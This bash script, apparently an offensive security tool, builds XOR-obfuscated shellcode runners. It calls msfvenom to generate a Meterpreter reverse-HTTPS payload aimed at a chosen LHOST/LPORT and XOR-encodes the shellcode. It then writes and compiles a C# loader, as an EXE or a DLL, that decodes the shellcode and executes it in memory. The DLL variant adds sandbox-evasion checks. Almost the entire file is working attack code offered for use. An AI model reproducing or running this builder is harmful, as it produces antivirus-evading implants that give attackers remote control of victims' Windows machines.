#!/bin/bash


echo -e "\e[1;31m"
cat << "EOF"
 ██╗  ██╗ ██████╗ ██████╗ ██████╗ ██╗ ██████╗ ██████╗ 
╚██╗██╔╝██╔═══██╗██╔══██╗██╔══██╗██║██╔═══██╗██╔══██╗
 ╚███╔╝ ██║   ██║██████╔╝██████╔╝██║██║   ██║██████╔╝
 ██╔██╗ ██║   ██║██╔══██╗██╔══██╗██║██║   ██║██╔══██╗
██╔╝ ██╗╚██████╔╝██║  ██║██║  ██║██║╚██████╔╝██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═╝
                                                       
             ░    XOR - Payload Builder - anans3
EOF
echo -e "\e[0m"



# Check for dependencies
# Check if mingw is installed
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null && ! command -v mcs &> /dev/null; then
    echo "[!] Missing dependency: Please install mingw-w64 or mono-mcs."
    echo "    sudo apt install mingw-w64 mono-mcs"
    exit 1
fi

# Collect Inputs
read -p "Enter msfvenom payload [windows/x64/meterpreter/reverse_https]: " PAYLOAD
PAYLOAD=${PAYLOAD:-windows/x64/meterpreter/reverse_https}

read -p "Enter LHOST [tun0]: " LHOST
LHOST=${LHOST:-tun0}

read -p "Enter LPORT [443]: " LPORT
LPORT=${LPORT:-443}

read -p "Enter XOR key (decimal or 0x.. hex) [0x12]: " XOR_KEY
XOR_KEY=${XOR_KEY:-0x12}

read -p "Output file name [runner]: " FILENAME
FILENAME=${FILENAME:-runner}

read -p "Output file type: exe or library (dll)? [exe]: " FILETYPE
FILETYPE=${FILETYPE:-exe}

if [[ "$FILETYPE" == "library" ]]; then
    TARGET_TYPE="library"
    FINAL_BIN="${FILENAME}.dll"
else
    TARGET_TYPE="exe"
    FINAL_BIN="${FILENAME}.exe"
fi

# Normalize XOR key
if [[ "$XOR_KEY" == 0x* ]]; then
    XOR_DEC=$((XOR_KEY))
else
    XOR_DEC=$XOR_KEY
fi

TMP_PAYLOAD="raw_shellcode.cs"
OUT_CSHARP="${FILENAME}_gen.cs"

# Generate msfvenom payload
echo "[*] Generating shellcode payload..."
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f csharp > "$TMP_PAYLOAD"

# Extract shellcode
SHELLCODE=$(awk '/byte\[.*\] \{/,/\};/' $TMP_PAYLOAD | sed -E 's/.*\{//; s/\}.*//; s/[[:space:]]+//g' | tr -d '\n')
IFS=',' read -ra BYTES <<< "$SHELLCODE"

if [ ${#BYTES[@]} -eq 0 ]; then
    echo "[!] Error: Shellcode extraction failed."
    exit 1
fi

# XOR encode
ENCODED=""
for b in "${BYTES[@]}"; do
    HEX="${b//0x/}"
    DEC=$((16#$HEX))
    XOR=$((DEC ^ XOR_DEC))
    ENCODED+="0x$(printf '%02x' $XOR), "
done
ENCODED=${ENCODED%, }

# Write C# loader
if [[ "$FILETYPE" == "library" ]]; then
  echo "[*] Building DLL shellcode loader..."
  cat > "$OUT_CSHARP" <<EOF
using System;
using System.Runtime.InteropServices;

namespace ReflectiveLoadDll
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null) return;

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5) return;

            byte[] buf = new byte[${#BYTES[@]}] { ${ENCODED} };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ $XOR_DEC);
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
EOF
else
  echo "[*] Building EXE shellcode runner..."
  cat > "$OUT_CSHARP" <<EOF
using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunnerXOR
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[${#BYTES[@]}] { ${ENCODED} };
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ $XOR_DEC));
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
EOF
fi

# Compile
echo "[*] Compiling with mcs..."
mcs -target:$TARGET_TYPE -out:"$FINAL_BIN" "$OUT_CSHARP"

if [ -f "$FINAL_BIN" ]; then
    echo -e "\n[+] Success! Generated \e[1;32m$FINAL_BIN\e[0m"
    if [[ "$TARGET_TYPE" == "library" ]]; then
        echo "[*] DLL Info: Namespace = ReflectiveLoadDll, Class = Class1, Method = runner"
    fi
else
    echo "[-] Compilation failed."
fi
